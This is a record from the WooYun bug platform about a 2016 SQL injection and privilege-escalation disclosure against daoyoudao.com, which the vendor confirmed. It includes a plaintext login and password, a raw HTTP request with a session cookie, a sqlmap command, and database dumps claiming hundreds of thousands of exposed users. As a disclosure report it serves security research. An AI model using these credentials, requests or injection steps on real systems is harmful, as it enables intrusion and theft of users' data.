{"id": 86251, "wybug_id": "wooyun-2016-0189559", "wybug_title": "道有道一处SQL注入导致77万用户账号密码泄露/泄露51万商家消息(可修改APK/内部多处越权)", "wybug_corp": "daoyoudao.com", "wybug_author": "黑色键盘丶", "wybug_date": "2016-03-27 12:18", "wybug_open_date": "2016-05-12 10:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向公众公开  简要描述： 315被曝光APP恶意吸费，但是下架APP就是防止APP不被篡改的方法吗 详细说明：  jiayoubama 密码1234567\n\n发现个权限大的号，管理的地区多，直接改密码\n\n编辑页可直接修改\n\n消息管理处越权查看任意信息\n\n\n\n客服管理客服这里编辑\n\n随便改一个\n\nSQL注入POST\nGET /mb/orderdetails.do?ordercode=mb1312311839006231 HTTP/1.1Host: m.mb.daoyoudao.comProxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: Hm_lvt_fe0b746d0d97ad96e482bd98c749aff3=1458912937; JSESSIONID=f7344699-6d82-4210-8560-4c12e847d260\n\n注入：F:\\sqlmap>sqlmap.py -r 2.txt --dbs\n数据库14个可垮裤查询 8w多订单 77w用户\n\n主库表\nDatabase: trade_01+--------------------------+---------+| Table                    | Entries |+--------------------------+---------+| f_client                 | 1141415 || f_msg                    | 517520  || f_loginlog               | 241888  || f_user                   | 176616  || f_product                | 173435  || f_freight                | 151668  || f_order_detail           | 116543  || f_product_attr_price     | 92166   || f_order                  | 82834   || f_product_subcat         | 76581   || f_product_11970_13849    | 73203   || f_product_copy           | 71224   || f_user_address           | 53635   || f_paydetail              | 49290   || f_product_attr           | 45317   || f_freefreight            | 44025   || f_page                   | 40193   || f_msg_product            | 31462   || f_cat_attr_value         | 29875   || dic_category             | 25700   || f_order_copy             | 21481   || f_paydetail_copy         | 14624   || f_fs_guanggao            | 7441    || f_category               | 4495    || f_guanggao               | 4391    || f_gglist_affiliated      | 4300    || f_information            | 4176    || f_order_operating_record | 3929    || f_cat_attr               | 3888    || f_client_copy            | 3353    || f_leaveword              | 2688    || f_user_group_relate      | 2554    || temp_msg                 | 2012    || f_favorites              | 863     || f_share                  | 826     || f_store                  | 574     || f_promotions             | 434     || f_usergroup              | 379     || f_quota                  | 330     || temp_user_id             | 211     || f_promotions_product     | 96      || f_adv                    | 46      || temp_mobile              | 2       |+--------------------------+---------+\n17w用户跑出数据证明下 \n\n数据库androidpn 60w用户\nDatabase: androidpn+------------------+---------+| Table            | Entries |+------------------+---------+| apn_user         | 608395  || apn_notification | 56547   |+------------------+---------+\n   漏洞证明：  jiayoubama 密码1234567\n\n发现个权限大的号，管理的地区多，直接改密码\n\n编辑页可直接修改\n\n消息管理处越权查看任意信息\n\n\n\n客服管理客服这里编辑\n\n随便改一个\n\nSQL注入POST\nGET /mb/orderdetails.do?ordercode=mb1312311839006231 HTTP/1.1Host: m.mb.daoyoudao.comProxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: Hm_lvt_fe0b746d0d97ad96e482bd98c749aff3=1458912937; JSESSIONID=f7344699-6d82-4210-8560-4c12e847d260\n\n注入：F:\\sqlmap>sqlmap.py -r 2.txt --dbs\n数据库14个可垮裤查询 8w多订单 77w用户\n\n主库表\nDatabase: trade_01+--------------------------+---------+| Table                    | Entries |+--------------------------+---------+| f_client                 | 1141415 || f_msg                    | 517520  || f_loginlog               | 241888  || f_user                   | 176616  || f_product                | 173435  || f_freight                | 151668  || f_order_detail           | 116543  || f_product_attr_price     | 92166   || f_order                  | 82834   || f_product_subcat         | 76581   || f_product_11970_13849    | 73203   || f_product_copy           | 71224   || f_user_address           | 53635   || f_paydetail              | 49290   || f_product_attr           | 45317   || f_freefreight            | 44025   || f_page                   | 40193   || f_msg_product            | 31462   || f_cat_attr_value         | 29875   || dic_category             | 25700   || f_order_copy             | 21481   || f_paydetail_copy         | 14624   || f_fs_guanggao            | 7441    || f_category               | 4495    || f_guanggao               | 4391    || f_gglist_affiliated      | 4300    || f_information            | 4176    || f_order_operating_record | 3929    || f_cat_attr               | 3888    || f_client_copy            | 3353    || f_leaveword              | 2688    || f_user_group_relate      | 2554    || temp_msg                 | 2012    || f_favorites              | 863     || f_share                  | 826     || f_store                  | 574     || f_promotions             | 434     || f_usergroup              | 379     || f_quota                  | 330     || temp_user_id             | 211     || f_promotions_product     | 96      || f_adv                    | 46      || temp_mobile              | 2       |+--------------------------+---------+\n17w用户跑出数据证明下 \n\n数据库androidpn 60w用户\nDatabase: androidpn+------------------+---------+| Table            | Entries |+------------------+---------+| apn_user         | 608395  || apn_notification | 56547   |+------------------+---------+\n   修复方案：  你懂得 修改密码啦   版权声明：转载请注明来源 黑色键盘丶@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-28 10:40 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-27 12:19 |    \t\t奶嘴 \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:93        | 16岁的毛孩有些厂商故意加你好友，和你聊...)\t\t \n  好样的    \n     2016-03-27 13:18 |    \t\tDeadSea \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:61        | 本人外形俊朗、眉清目秀、玉树临风、有明星...)\t\t \n  可以不用吃屎了~    \n     2016-03-27 13:33 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:2293 漏洞数:483        | 我就问，还有谁！！！！！！！！！！！！！...)\t\t \n  315后续再次施加压力，键盘你好样的。程序员保证不打屎你。。。    \n     2016-03-27 14:01 |    \t\t黑色键盘丶 \t\t\t( 普通白帽子  |\t\t\t        Rank:1336 漏洞数:298        | 哥,是孤独风中的一匹狼)\t\t \n  @小龙 社会我龙哥6    \n     2016-03-27 14:49 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:760 漏洞数:149        | raw_input(\"你知道我要输入什么？\"))\t\t \n  记得黑色键盘曾经是我看过的一本黑客小说作者    \n     2016-03-27 14:55 |    \t\t黑色键盘丶 \t\t\t( 普通白帽子  |\t\t\t        Rank:1336 漏洞数:298        | 哥,是孤独风中的一匹狼)\t\t \n  @Aasron 666    \n     2016-03-27 15:05 |    \t\t’‘Nome \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:31        | 有事请发邮件，2859857@gmail.com，垃圾邮...)\t\t \n  @黑色键盘丶 说好的吃屎呢?    \n     2016-03-27 15:07 |    \t\t黑色键盘丶 \t\t\t( 普通白帽子  |\t\t\t        Rank:1336 漏洞数:298        | 哥,是孤独风中的一匹狼)\t\t \n  @’‘Nome sea吃    \n     2016-03-27 16:13 |    \t\tFormat_smile \t\t\t( 普通白帽子  |\t\t\t        Rank:484 漏洞数:172        | ···孰能无过，谁是谁非！)\t\t \n  干得漂亮    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}